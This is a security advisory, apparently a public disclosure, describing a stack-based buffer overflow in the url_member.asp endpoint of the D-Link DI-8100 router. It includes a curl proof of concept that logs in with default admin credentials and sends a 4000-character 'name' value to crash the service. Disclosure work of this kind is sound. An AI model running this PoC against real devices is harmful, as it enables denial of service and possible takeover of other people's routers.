##  DI-8100 Router `url_member.asp` Stack Buffer Overflow (CWE-121)

### Advisory Information

- **Vendor:** D-Link 
- **Affected Product:** DI-8100 
- **Vulnerability Type:** Stack-based Buffer Overflow (CWE-121)


### Summary

The DI-8100 router web management interface contains a stack-based buffer overflow vulnerability in the `/url_member.asp` endpoint. An authenticated attacker can supply an overly long string to the `name` parameter when performing an `add` operation. This input is copied into a fixed-size stack buffer without proper length validation, leading to memory corruption, process crash, and potential remote code execution.

---

### Vulnerability Details

<img width="1813" height="459" alt="image" src="https://github.com/user-attachments/assets/6541178d-fe5e-4b31-b4d6-7917e6aa8465" />

<img width="1767" height="538" alt="image" src="https://github.com/user-attachments/assets/7cea4731-c5b3-41ca-b0ca-e0e89567a74e" />


### Proof of Concept (PoC)

```bash
curl -c cookies.txt -X POST "http://192.168.0.1/login.cgi" -d "user=admin&password=admin"

curl -b cookies.txt -X POST "http://192.168.0.1/url_member.asp" \
  -d "opt=add&u=test&gid=1" \
  --data-urlencode "name=$(printf 'A%.0s' {1..4000})"
```
<img width="2199" height="491" alt="image" src="https://github.com/user-attachments/assets/bea8f553-5a08-47b9-8c68-0bf4f2ba7aa8" />





